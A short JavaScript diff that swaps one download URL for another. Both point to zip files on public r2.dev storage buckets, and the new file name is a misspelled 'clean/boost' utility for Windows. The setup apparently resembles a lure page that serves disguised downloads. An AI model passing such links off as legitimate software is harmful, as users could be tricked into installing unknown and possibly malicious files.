@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] = 'https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/quick-speue.zip';
+    window['filename'] = 'https://pub-addb8ef101184b368c467ebe49c123d9.r2.dev/CleanQueckqBaost_win7-11s_v3.1.9_x64.zip';
 })();
